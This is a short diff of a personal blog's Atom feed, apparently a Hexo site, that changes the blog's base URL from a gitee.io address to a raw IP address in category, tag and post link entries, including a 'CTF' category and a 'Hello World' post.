     <updated>2021-03-31T09:56:19.397Z</updated>
     
@@ -401,17 +401,17 @@
     
     
     
-    <category term="CTF" scheme="https://atkx.gitee.io/categories/CTF/"/>
+    <category term="CTF" scheme="http://47.119.122.254/categories/CTF/"/>
     
     
-    <category term="搭建博客" scheme="https://atkx.gitee.io/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
+    <category term="搭建博客" scheme="http://47.119.122.254/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
     
   </entry>
   
   <entry>
     <title>Hello World</title>
-    <link href="https://atkx.gitee.io/2020/02/02/hello-world/"/>
-    <id>https://atkx.gitee.io/2020/02/02/hello-world/</id>
+    <link href="http://47.119.122.254/2020/02/02/hello-world/"/>
+    <id>http://47.119.122.254/2020/02/02/hello-world/</id>
     <published>2020-02-01T18:02:02.000Z</published>
     <updated>2021-02-05T04:19:06.601Z</updated>
     
